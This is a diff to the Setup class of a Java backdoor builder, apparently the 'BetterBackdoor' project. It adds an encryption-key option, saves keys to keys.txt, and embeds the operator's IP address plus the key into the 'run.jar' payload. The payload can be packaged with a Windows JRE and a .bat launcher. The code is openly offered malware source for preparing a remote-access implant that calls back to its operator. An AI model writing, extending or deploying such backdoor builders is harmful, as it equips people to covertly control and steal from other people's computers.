@@ -1,10 +1,6 @@
 package dev.thatcherclough.betterbackdoor;
 
-import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.IOException;
-import java.io.PrintWriter;
-import java.io.Writer;
+import java.io.*;
 import java.net.URI;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.FileSystem;
@@ -30,17 +26,19 @@ public class Setup {
 	 * false but directory 'jre' containing a Windows JRE distribution exists, 'jre'
 	 * is copied to 'backdoor' and {@code #createBat(String, String, String)} is
 	 * used to create a '.bat' file for running the backdoor in the JRE. 'run.jar'
-	 * is copied from 'target' to 'backdoor' and 'ip' is appended into it using
+	 * is copied from 'target' to 'backdoor' and 'info' is appended into it using
 	 * {@code #appendJar(String, String, String)}. If {@code ipType} is "internal",
-	 * 'ip' will contain the internal IP address of the current machine. Otherwise,
-	 * if {@code ipType} is "external", 'ip' will contain the external IP address of
-	 * the current machine.
+	 * 'info' will contain the internal IP address of the current machine. Otherwise,
+	 * if {@code ipType} is "external", 'info' will contain the external IP address of
+	 * the current machine. If {@code encryptionKey} is not null, 'info' will also contain
+	 * {@code encryptionKey}.
 	 *
-	 * @param packageJre if a JRE should be packaged with the backdoor
-	 * @param ipType     type of IP address to append to 'run.jar'
+	 * @param packageJre    if a JRE should be packaged with the backdoor
+	 * @param ipType        type of IP address to append to 'run.jar'
+	 * @param encryptionKey key to be used to encrypt backdoor data
 	 * @throws IOException
 	 */
-	public static void create(boolean packageJre, String ipType) throws IOException {
+	public static void create(boolean packageJre, String ipType, String encryptionKey) throws IOException {
 		if (packageJre) {
 			String jrePath = System.getProperty("java.home");
 			FileUtils.copyDirectory(new File(jrePath + File.separator + "bin"),
@@ -54,7 +52,16 @@ public class Setup {
 		}
 		FileUtils.copyFile(new File("target" + File.separator + "run.jar"),
 				new File("backdoor" + File.separator + "run.jar"));
-		appendJar("backdoor" + File.separator + "run.jar", "/ip", Utils.getIP(ipType));
+
+		String info = Utils.getIP(ipType);
+		if (encryptionKey != null) {
+			PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter("keys.txt", true)));
+			out.println(encryptionKey);
+			out.flush();
+			out.close();
+			info += "-" + encryptionKey;
+		}
+		appendJar("backdoor" + File.separator + "run.jar", "/info", info);
 	}
 
 	/**
